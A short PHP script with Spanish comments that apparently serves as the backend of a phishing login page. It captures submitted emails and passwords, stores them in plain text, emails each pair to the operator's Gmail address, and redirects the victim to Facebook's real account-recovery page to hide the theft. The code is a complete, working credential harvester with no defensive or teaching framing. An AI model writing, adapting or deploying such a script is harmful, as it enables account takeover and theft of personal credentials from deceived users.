<?php
// Datos de la base de datos
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "login";

// Crear conexión
$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Obtener datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Protegerse contra inyección SQL
$email = $conn->real_escape_string($email);
$password = $conn->real_escape_string($password);

// Insertar datos en la base de datos
$sql = "INSERT INTO usuarios (email, password) VALUES ('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    // Enviar correo electrónico
    $to = "tu_correo@gmail.com";
    $subject = "Nuevo registro de usuario";
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = "From: no-reply@tu-dominio.com";

    mail($to, $subject, $message, $headers);

    // Redirigir al enlace especificado
    header("Location: https://www.facebook.com/recover/account/");
    exit();
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

// Cerrar conexión
$conn->close();
?>
